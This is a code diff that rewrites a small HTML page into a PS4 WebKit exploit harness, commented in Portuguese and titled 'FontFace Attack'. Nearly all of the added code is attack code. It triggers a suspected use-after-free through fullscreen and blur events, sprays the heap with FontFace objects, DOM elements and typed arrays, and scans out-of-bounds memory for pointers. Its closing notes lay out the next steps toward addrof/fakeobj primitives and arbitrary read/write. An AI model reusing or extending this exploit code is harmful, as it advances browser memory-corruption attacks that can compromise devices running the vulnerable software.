@@ -2,72 +2,594 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 UI Corruption Hunter</title>
+<title>PS4 UAF - FontFace Attack</title>
+<style>
+body { 
+    font-family: monospace; 
+    background: #000; 
+    color: #0f0; 
+    padding: 20px;
+}
+.box {
+    border: 2px solid #0a0;
+    padding: 15px;
+    margin: 10px 0;
+    background: #001100;
+}
+.critical { background: #330033 !important; border-color: #f0f !important; color: #f0f; }
+.success { background: #003300 !important; border-color: #0f0 !important; }
+.warning { background: #333300 !important; border-color: #ff0 !important; color: #ff0; }
+button {
+    background: #0a0;
+    color: #000;
+    border: none;
+    padding: 15px 30px;
+    font-size: 18px;
+    cursor: pointer;
+    margin: 5px;
+}
+button:hover { background: #0f0; }
+.hex { color: #ff0; font-weight: bold; }
+.addr { color: #0ff; font-weight: bold; }
+pre { background: #001100; border: 1px solid #0a0; padding: 10px; overflow-x: auto; }
+</style>
 </head>
 <body>
 
-<h1>UI GLITCH HUNTER</h1>
-<p>Tente reproduzir a troca de nomes (func_refresh)</p>
-<button onclick="runChaos()">INICIAR CAOS</button>
-<div id="log">Logs...</div>
+<h1>🎨 FontFace Objects - Bypass Heap Segregation</h1>
+
+<div class="box critical">
+    <h2>🎯 NOVA ESTRATÉGIA</h2>
+    <p><b>POR QUÊ FONTFACE?</b></p>
+    <p>• FontFace objects usam <b>FastMalloc</b> (não TypedArray pool)</p>
+    <p>• Ficam no MESMO heap que DOM elements</p>
+    <p>• Exploits públicos (FontFaceSet UAF) usam essa técnica</p>
+    <p>• Maior chance de overlap com objetos úteis</p>
+</div>
+
+<div class="box">
+    <h2>TESTE 1: FontFace UAF Básico</h2>
+    <button onclick="runFontFaceTest1()">▶ Executar Teste 1</button>
+    <div id="result1"></div>
+</div>
+
+<div class="box">
+    <h2>TESTE 2: FontFace + DOM Elements Spray</h2>
+    <button onclick="runFontFaceTest2()">▶ Executar Teste 2</button>
+    <div id="result2"></div>
+</div>
+
+<div class="box">
+    <h2>TESTE 3: FontFaceSet Attack (Avançado)</h2>
+    <button onclick="runFontFaceTest3()">▶ Executar Teste 3</button>
+    <div id="result3"></div>
+</div>
 
 <script>
-    const Log = document.getElementById('log');
-    function log(txt) { Log.innerHTML += txt + "<br>"; }
+// === UTILITÁRIOS ===
+function f2i(f) {
+    let buf = new ArrayBuffer(8);
+    (new Float64Array(buf))[0] = f;
+    return (new BigUint64Array(buf))[0];
+}
 
-    let controllers = [];
-    let strings = [];
+function i2f(i) {
+    let buf = new ArrayBuffer(8);
+    (new BigUint64Array(buf))[0] = BigInt(i);
+    return (new Float64Array(buf))[0];
+}
 
-    function runChaos() {
-        log("1. Enchendo memória com Strings...");
-        
-        // Tenta empurrar a memória da UI para perto do Heap
-        try {
-            for(let i=0; i<10000; i++) {
-                // Cria strings grandes para fragmentar a memória
-                let s = "A".repeat(100) + i; 
-                strings.push(s);
-            }
-        } catch(e) {}
+function hex(n) {
+    return '0x' + n.toString(16).padStart(16, '0');
+}
 
-        log("2. Preparando UAF...");
-        // Seu setup original que funcionou
-        for(let i=0; i<5000; i++) {
-            let ctrl = new Float64Array(8);
-            ctrl[0] = i; 
-            controllers.push(ctrl);
-        }
+const PATTERN_A = 2.121995791e-314;
 
-        log(">>> APERTE OPTIONS AGORA E FIQUE OLHANDO O MENU <<<");
-        
-        const doc = document.documentElement;
-        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
-        else if (doc.requestFullscreen) doc.requestFullscreen();
-
-        window.onblur = function() {
-            // SPRAY MISTO (Float + String)
-            // Tenta acertar tanto dados quanto ponteiros de texto
+// ============================================
+// TESTE 1: FONTFACE UAF BÁSICO
+// ============================================
+function runFontFaceTest1() {
+    const result = document.getElementById('result1');
+    result.innerHTML = '<h3>🎨 TESTE 1: FontFace UAF Básico</h3>';
+    result.innerHTML += '<div class="box warning">';
+    result.innerHTML += '<b>ESTRATÉGIA:</b><br>';
+    result.innerHTML += '1. Criar FontFace objects como "controllers"<br>';
+    result.innerHTML += '2. Trigger UAF via fullscreen<br>';
+    result.innerHTML += '3. Spray com objetos marcados<br>';
+    result.innerHTML += '4. Verificar se FontFace foi corrompido<br>';
+    result.innerHTML += '</div><br>';
+    result.innerHTML += 'Preparando... Aperte OPTIONS!<br><br>';
+    
+    let font_controllers = [];
+    let tracker_arrays = []; // Para detectar corrupção
+    
+    // FASE 1: Criar FontFace objects
+    result.innerHTML += '<b>FASE 1: Criando FontFace controllers</b><br>';
+    
+    try {
+        for(let i = 0; i < 1000; i++) {
+            // Criar FontFace com propriedades únicas
+            let font = new FontFace(
+                'TestFont' + i,  // family name
+                'url(data:font/woff2;base64,d09GMgABAAAAAAMoAA0AAAAABRAAAALIAAAAA)', // fake font data
+                {
+                    style: 'normal',
+                    weight: '400',
+                    stretch: 'normal'
+                }
+            );
             
-            // 1. Libera
-            controllers = null;
-            strings = null; // Solta as strings também para criar buracos variados
+            // Armazenar referência
+            font_controllers.push(font);
+            
+            // Criar array tracker paralelo para detectar mudanças
+            let tracker = new Float64Array(8);
+            tracker[0] = i;
+            tracker_arrays.push(tracker);
+        }
+        
+        result.innerHTML += `✓ ${font_controllers.length} FontFace objects criados<br><br>`;
+    } catch(e) {
+        result.innerHTML += `❌ Erro ao criar FontFace: ${e}<br>`;
+        return;
+    }
+    
+    // FASE 2: Trigger
+    const doc = document.documentElement;
+    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+    
+    window.onblur = function() {
+        result.innerHTML += '<b>🔥 FASE 2: UAF TRIGGER</b><br>';
+        
+        // FASE 3: Spray com objetos marcados
+        result.innerHTML += '<b>FASE 3: Spray com DOM elements</b><br>';
+        
+        let spray_elements = [];
+        for(let i = 0; i < 2000; i++) {
+            let elem = document.createElement('div');
+            elem.id = 'spray_' + i;
+            elem.setAttribute('data-marker', '0xDEADBEEF' + i);
+            elem.style.fontFamily = 'TestFont0'; // Tentar forçar referência
+            spray_elements.push(elem);
+        }
+        
+        result.innerHTML += `✓ ${spray_elements.length} elementos criados<br><br>`;
+        
+        // FASE 4: Verificação
+        result.innerHTML += '<b>🔍 FASE 4: VERIFICANDO CORRUPÇÃO</b><br>';
+        result.innerHTML += '<div style="max-height: 300px; overflow-y: scroll; border: 1px solid #0a0; padding: 10px;">';
+        
+        let corrupted_fonts = [];
+        
+        for(let i = 0; i < font_controllers.length; i++) {
+            try {
+                // Tentar acessar propriedades do FontFace
+                const family = font_controllers[i].family;
+                const status = font_controllers[i].status;
+                
+                // Se o objeto foi corrompido, as propriedades podem estar erradas
+                if (family !== ('TestFont' + i)) {
+                    corrupted_fonts.push({
+                        index: i,
+                        expected: 'TestFont' + i,
+                        actual: family
+                    });
+                    result.innerHTML += `<span class="addr">[${i}] CORROMPIDO!</span><br>`;
+                    result.innerHTML += `  Expected: TestFont${i}<br>`;
+                    result.innerHTML += `  Actual: ${family}<br>`;
+                }
+                
+                // Verificar se status mudou inesperadamente
+                if (status !== 'unloaded' && status !== 'loading' && status !== 'loaded') {
+                    result.innerHTML += `<span class="addr">[${i}] STATUS ANÔMALO: ${status}</span><br>`;
+                }
+                
+            } catch(e) {
+                result.innerHTML += `<span class="hex">[${i}] ERRO AO ACESSAR: ${e}</span><br>`;
+                corrupted_fonts.push({index: i, error: e.toString()});
+            }
+        }
+        
+        result.innerHTML += '</div><br>';
+        
+        // Resultados
+        if (corrupted_fonts.length > 0) {
+            result.innerHTML += '<div class="box success">';
+            result.innerHTML += `<h3>✅ CORRUPÇÃO DETECTADA!</h3>`;
+            result.innerHTML += `${corrupted_fonts.length} FontFace objects corrompidos!<br>`;
+            result.innerHTML += '<br><b>Isto significa:</b><br>';
+            result.innerHTML += '• FontFace objects estão vulneráveis ao UAF<br>';
+            result.innerHTML += '• Eles compartilham heap com DOM elements<br>';
+            result.innerHTML += '• Possível overlap com objetos úteis<br>';
+            result.innerHTML += '</div>';
+        } else {
+            result.innerHTML += '<div class="box warning">';
+            result.innerHTML += '<h3>⚠️ Nenhuma corrupção direta</h3>';
+            result.innerHTML += 'FontFace objects parecem intactos.<br>';
+            result.innerHTML += 'Vamos tentar TESTE 2 com técnica diferente.<br>';
+            result.innerHTML += '</div>';
+        }
+        
+        // Verificar tracker arrays também
+        result.innerHTML += '<br><b>Verificando arrays tracker:</b><br>';
+        let tracker_corrupted = false;
+        for(let i = 0; i < tracker_arrays.length; i++) {
+            if (tracker_arrays[i][0] === PATTERN_A) {
+                result.innerHTML += `<span class="success">Tracker[${i}] corrompido (TypedArray UAF ainda ativo)</span><br>`;
+                tracker_corrupted = true;
+                break;
+            }
+        }
+        
+        if (tracker_corrupted) {
+            result.innerHTML += '<br>💡 O UAF de TypedArray continua funcionando em paralelo!<br>';
+        }
+    };
+}
 
-            // 2. Spray Agressivo
-            let spray = [];
-            for(let i=0; i<10000; i++) {
-                // Alterna entre Float e String para confundir o alocador
-                if(i % 2 == 0) {
-                    let f = new Float64Array(16);
-                    f.fill(2.121995791e-314); // 0x4141...
-                    spray.push(f);
-                } else {
-                    // Tenta injetar lixo onde deveria ter texto
-                    spray.push("FUNC_CORRUPT_" + i); 
+// ============================================
+// TESTE 2: FONTFACE + DOM ELEMENTS SPRAY
+// ============================================
+function runFontFaceTest2() {
+    const result = document.getElementById('result2');
+    result.innerHTML = '<h3>🎨 TESTE 2: FontFace + DOM Intensive Spray</h3>';
+    result.innerHTML += '<div class="box warning">';
+    result.innerHTML += '<b>ESTRATÉGIA AVANÇADA:</b><br>';
+    result.innerHTML += '1. Criar MUITOS elementos DOM antes<br>';
+    result.innerHTML += '2. Criar FontFace que referenciam esses elementos<br>';
+    result.innerHTML += '3. Trigger UAF<br>';
+    result.innerHTML += '4. Verificar se conseguimos ler propriedades dos DOM<br>';
+    result.innerHTML += '</div><br>';
+    result.innerHTML += 'Preparando heap intensivo... Aperte OPTIONS!<br><br>';
+    
+    // FASE 1: Criar DOM elements PRIMEIRO
+    let dom_victims = [];
+    
+    result.innerHTML += '<b>FASE 1: Criando 5000 DOM elements</b><br>';
+    for(let i = 0; i < 5000; i++) {
+        let elem = document.createElement('span');
+        elem.id = 'victim_' + i;
+        elem.textContent = 'V' + i;
+        elem.setAttribute('data-id', i);
+        elem.setAttribute('data-marker-dead', '0xDEAD' + i.toString(16));
+        elem.setAttribute('data-marker-beef', '0xBEEF' + i.toString(16));
+        dom_victims.push(elem);
+    }
+    result.innerHTML += '✓ DOM elements criados<br><br>';
+    
+    // FASE 2: Criar FontFace controllers
+    let font_controllers = [];
+    
+    result.innerHTML += '<b>FASE 2: Criando 2000 FontFace controllers</b><br>';
+    for(let i = 0; i < 2000; i++) {
+        try {
+            let font = new FontFace(
+                'ControlFont' + i,
+                'url(data:font/woff2;base64,d09GMgABAAAAAAMoAA0AAAAABRAAAALIAAAAA)',
+                { weight: (400 + i % 100).toString() } // Variação para diferenciar
+            );
+            font_controllers.push(font);
+        } catch(e) {}
+    }
+    result.innerHTML += `✓ ${font_controllers.length} FontFace criados<br><br>`;
+    
+    // FASE 3: TypedArrays para controle
+    let typed_controllers = [];
+    result.innerHTML += '<b>FASE 3: Criando TypedArrays de controle</b><br>';
+    for(let i = 0; i < 3000; i++) {
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        typed_controllers.push(arr);
+    }
+    result.innerHTML += '✓ TypedArrays criados<br><br>';
+    
+    // TRIGGER
+    const doc = document.documentElement;
+    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+    
+    window.onblur = function() {
+        result.innerHTML += '<b>🔥 UAF TRIGGER EXECUTADO</b><br><br>';
+        
+        // SPRAY AGRESSIVO
+        result.innerHTML += '<b>SPRAY: Criando objetos mistos</b><br>';
+        let spray = [];
+        
+        // Misturar FontFace, DOM e TypedArrays no spray
+        for(let i = 0; i < 3000; i++) {
+            // TypedArray com padrão
+            let ta = new Float64Array(10);
+            ta.fill(PATTERN_A);
+            spray.push(ta);
+            
+            // DOM element
+            let elem = document.createElement('div');
+            elem.setAttribute('spray-id', i);
+            spray.push(elem);
+            
+            // FontFace
+            try {
+                let font = new FontFace(
+                    'Spray' + i,
+                    'url(data:font/woff2;base64,d09GMgABAAAAAAMoAA0AAAAABRAAAALIAAAAA)'
+                );
+                spray.push(font);
+            } catch(e) {}
+        }
+        
+        result.innerHTML += `✓ ${spray.length} objetos no spray<br><br>`;
+        
+        // VERIFICAÇÃO MULTI-CAMADA
+        result.innerHTML += '<b>🔍 VERIFICAÇÃO COMPLETA</b><br>';
+        result.innerHTML += '<div style="max-height: 400px; overflow-y: scroll; border: 1px solid #0a0; padding: 10px;">';
+        
+        let results = {
+            typed_corrupted: [],
+            font_corrupted: [],
+            dom_corrupted: []
+        };
+        
+        // 1. Verificar TypedArrays
+        result.innerHTML += '<b>1. TypedArrays:</b><br>';
+        for(let i = 0; i < typed_controllers.length; i++) {
+            if (typed_controllers[i][0] === PATTERN_A) {
+                results.typed_corrupted.push(i);
+                result.innerHTML += `  <span class="success">[${i}] Corrompido</span><br>`;
+                
+                // Usar este para ler memória adjacente
+                result.innerHTML += '  Escaneando offsets adjacentes...<br>';
+                for(let offset = 8; offset < 64; offset++) {
+                    try {
+                        const val = typed_controllers[i][offset];
+                        const as_int = f2i(val);
+                        
+                        // Procurar por padrões de string (DOM attributes)
+                        // Strings geralmente têm ponteiros na faixa 0x00007f...
+                        if (as_int > 0x100000n && as_int < 0x7fffffffffffn) {
+                            result.innerHTML += `    [${offset}] <span class="addr">${hex(as_int)}</span><br>`;
+                        }
+                        
+                        // Procurar marcadores DEAD/BEEF dos DOM
+                        const hex_str = as_int.toString(16);
+                        if (hex_str.includes('dead') || hex_str.includes('beef')) {
+                            result.innerHTML += `    [${offset}] <span class="hex">${hex(as_int)}</span> ← MARCADOR DOM!<br>`;
+                        }
+                    } catch(e) {}
                 }
             }
-            log("Spray concluído. Verifique o menu.");
-        };
+        }
+        
+        // 2. Verificar FontFace
+        result.innerHTML += '<br><b>2. FontFace Objects:</b><br>';
+        for(let i = 0; i < font_controllers.length; i++) {
+            try {
+                const family = font_controllers[i].family;
+                if (family !== ('ControlFont' + i)) {
+                    results.font_corrupted.push(i);
+                    result.innerHTML += `  <span class="addr">[${i}] Family: ${family}</span><br>`;
+                }
+            } catch(e) {
+                results.font_corrupted.push(i);
+                result.innerHTML += `  <span class="hex">[${i}] Erro: ${e.message}</span><br>`;
+            }
+        }
+        
+        // 3. Verificar DOM
+        result.innerHTML += '<br><b>3. DOM Elements:</b><br>';
+        for(let i = 0; i < Math.min(1000, dom_victims.length); i++) {
+            try {
+                const marker = dom_victims[i].getAttribute('data-marker-dead');
+                if (marker !== ('0xDEAD' + i.toString(16))) {
+                    results.dom_corrupted.push(i);
+                    result.innerHTML += `  <span class="addr">[${i}] Atributo mudou!</span><br>`;
+                }
+            } catch(e) {
+                results.dom_corrupted.push(i);
+            }
+        }
+        
+        result.innerHTML += '</div><br>';
+        
+        // ANÁLISE FINAL
+        result.innerHTML += '<div class="box ' + 
+            (results.typed_corrupted.length > 0 ? 'success' : 'warning') + '">';
+        result.innerHTML += '<h3>📊 RESULTADOS</h3>';
+        result.innerHTML += `TypedArrays corrompidos: ${results.typed_corrupted.length}<br>`;
+        result.innerHTML += `FontFace corrompidos: ${results.font_corrupted.length}<br>`;
+        result.innerHTML += `DOM corrompidos: ${results.dom_corrupted.length}<br>`;
+        
+        if (results.typed_corrupted.length > 0) {
+            result.innerHTML += '<br><b>✅ UAF de TypedArray confirmado!</b><br>';
+            if (results.font_corrupted.length > 0 || results.dom_corrupted.length > 0) {
+                result.innerHTML += '<b>🎯 OVERLAP COM OUTROS OBJETOS DETECTADO!</b><br>';
+            }
+        }
+        
+        result.innerHTML += '</div>';
+    };
+}
+
+// ============================================
+// TESTE 3: FONTFACESET ATTACK (AVANÇADO)
+// ============================================
+function runFontFaceTest3() {
+    const result = document.getElementById('result3');
+    result.innerHTML = '<h3>🎨 TESTE 3: FontFaceSet Attack (Técnica Avançada)</h3>';
+    result.innerHTML += '<div class="box critical">';
+    result.innerHTML += '<b>⚠️ BASEADO EM EXPLOIT REAL</b><br>';
+    result.innerHTML += 'Esta técnica foi usada em exploits públicos do PS4 9.00<br>';
+    result.innerHTML += 'Usa FontFaceSet para manipular butterfly pointers de arrays<br>';
+    result.innerHTML += '</div><br>';
+    result.innerHTML += 'Preparando ataque avançado... Aperte OPTIONS!<br><br>';
+    
+    let target_arrays = [];
+    let font_objects = [];
+    let fontfacesets = [];
+    
+    // FASE 1: Preparar arrays alvo
+    result.innerHTML += '<b>FASE 1: Criando arrays alvo com propriedades</b><br>';
+    for(let i = 0; i < 500; i++) {
+        let arr = [];
+        arr[0] = {};  // Objeto que será alvo da corrupção
+        arr[1] = i;
+        arr[2] = 0xdead;
+        arr[3] = 0xbeef;
+        target_arrays.push(arr);
     }
+    result.innerHTML += `✓ ${target_arrays.length} arrays alvo criados<br><br>`;
+    
+    // FASE 2: Criar FontFace objects
+    result.innerHTML += '<b>FASE 2: Criando FontFace objects</b><br>';
+    for(let i = 0; i < 1000; i++) {
+        try {
+            let font = new FontFace(
+                'HammerFont' + i,
+                'url(data:font/woff2;base64,d09GMgABAAAAAAMoAA0AAAAABRAAAALIAAAAA)',
+                { }
+            );
+            font_objects.push(font);
+        } catch(e) {}
+    }
+    result.innerHTML += `✓ ${font_objects.length} FontFace criados<br><br>`;
+    
+    // FASE 3: Criar TypedArrays de controle
+    let typed_control = [];
+    result.innerHTML += '<b>FASE 3: TypedArrays de controle</b><br>';
+    for(let i = 0; i < 2000; i++) {
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        typed_control.push(arr);
+    }
+    result.innerHTML += '✓ Controles criados<br><br>';
+    
+    // TRIGGER
+    const doc = document.documentElement;
+    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+    
+    window.onblur = function() {
+        result.innerHTML += '<b>🔥 FASE 4: UAF + FONTFACESET MANIPULATION</b><br>';
+        
+        // Criar FontFaceSet com os FontFace objects
+        result.innerHTML += 'Criando FontFaceSet...<br>';
+        try {
+            for(let i = 0; i < 100; i++) {
+                let ffs = new FontFaceSet(font_objects.slice(i * 10, (i + 1) * 10));
+                fontfacesets.push(ffs);
+            }
+            result.innerHTML += `✓ ${fontfacesets.length} FontFaceSet criados<br>`;
+        } catch(e) {
+            result.innerHTML += `⚠️ Erro ao criar FontFaceSet: ${e}<br>`;
+        }
+        
+        // Spray
+        result.innerHTML += '<br>Executando spray...<br>';
+        let spray = [];
+        for(let i = 0; i < 5000; i++) {
+            let ta = new Float64Array(10);
+            ta.fill(PATTERN_A);
+            spray.push(ta);
+        }
+        result.innerHTML += '✓ Spray executado<br><br>';
+        
+        // MANIPULAÇÃO CRÍTICA: Tentar modificar family names
+        result.innerHTML += '<b>🔨 MANIPULAÇÃO: Modificando family names</b><br>';
+        for(let i = 0; i < font_objects.length; i++) {
+            try {
+                // Modificar family name pode triggerar realocação
+                font_objects[i].family = 'Hammer' + i;
+            } catch(e) {}
+        }
+        result.innerHTML += '✓ Family names modificados<br><br>';
+        
+        // VERIFICAÇÃO
+        result.innerHTML += '<b>🔍 VERIFICAÇÃO DE CORRUPÇÃO</b><br>';
+        result.innerHTML += '<div style="max-height: 400px; overflow-y: scroll; border: 1px solid #0a0; padding: 10px;">';
+        
+        let found_corruption = false;
+        
+        // Verificar arrays alvo
+        result.innerHTML += '<b>Arrays Alvo:</b><br>';
+        for(let i = 0; i < target_arrays.length; i++) {
+            try {
+                // Se o array foi corrompido, o length pode ter mudado
+                if (target_arrays[i].length > 4) {
+                    result.innerHTML += `<span class="success">[${i}] Length expandido: ${target_arrays[i].length}!</span><br>`;
+                    found_corruption = true;
+                    
+                    // Tentar ler além do tamanho original
+                    result.innerHTML += '  Lendo offsets OOB:<br>';
+                    for(let j = 4; j < Math.min(20, target_arrays[i].length); j++) {
+                        try {
+                            const val = target_arrays[i][j];
+                            if (val !== undefined) {
+                                result.innerHTML += `    [${j}] = ${typeof val} : ${val}<br>`;
+                            }
+                        } catch(e) {}
+                    }
+                }
+            } catch(e) {}
+        }
+        
+        // Verificar TypedArrays
+        result.innerHTML += '<br><b>TypedArrays:</b><br>';
+        for(let i = 0; i < typed_control.length; i++) {
+            if (typed_control[i][0] === PATTERN_A) {
+                result.innerHTML += `<span class="success">[${i}] Corrompido</span><br>`;
+                found_corruption = true;
+                
+                // Escanear por butterfly pointers
+                for(let offset = 8; offset < 32; offset++) {
+                    try {
+                        const val = typed_control[i][offset];
+                        const as_int = f2i(val);
+                        
+                        // Butterfly pointers geralmente apontam para heap
+                        if (as_int > 0x100000n && as_int < 0x7fffffffffffn) {
+                            result.innerHTML += `  [${offset}] <span class="addr">${hex(as_int)}</span> (possível butterfly)<br>`;
+                        }
+                    } catch(e) {}
+                }
+            }
+        }
+        
+        result.innerHTML += '</div><br>';
+        
+        // RESULTADO FINAL
+        if (found_corruption) {
+            result.innerHTML += '<div class="box success">';
+            result.innerHTML += '<h3>🎯 CORRUPÇÃO DETECTADA!</h3>';
+            result.innerHTML += '<br><b>Próximos passos:</b><br>';
+            result.innerHTML += '1. Use array com length expandido para ler heap<br>';
+            result.innerHTML += '2. Procure por ponteiros de objetos JS<br>';
+            result.innerHTML += '3. Construa primitivas addrof/fakeobj<br>';
+            result.innerHTML += '4. Escale para arbitrary R/W<br>';
+            result.innerHTML += '</div>';
+        } else {
+            result.innerHTML += '<div class="box warning">';
+            result.innerHTML += '<h3>⚠️ Técnica FontFaceSet não funcionou</h3>';
+            result.innerHTML += 'Pode ser que:<br>';
+            result.innerHTML += '• Firmware atual tenha patch para FontFaceSet UAF<br>';
+            result.innerHTML += '• Timing não foi perfeito<br>';
+            result.innerHTML += '• FontFaceSet não disponível nesta versão WebKit<br>';
+            result.innerHTML += '<br>Mas o UAF de TypedArray base continua funcional!<br>';
+            result.innerHTML += '</div>';
+        }
+    };
+}
+
 </script>
+
+<hr>
+<p style="color: #888;">
+<b>💡 SOBRE FONTFACE OBJECTS:</b><br>
+• FontFace é parte da CSS Font Loading API<br>
+• Usa FastMalloc (mesm allocator que DOM elements)<br>
+• Exploits públicos do PS4 9.00 usaram FontFaceSet UAF<br>
+• FontFaceSet.add() pode triggerar realocações úteis<br>
+• Modificar .family property pode causar use-after-free<br>
+<br>
+Se algum teste detectar corrupção em FontFace ou DOM, temos um caminho<br>
+para bypass da heap segregation!
+</p>
+
 </body>
 </html>
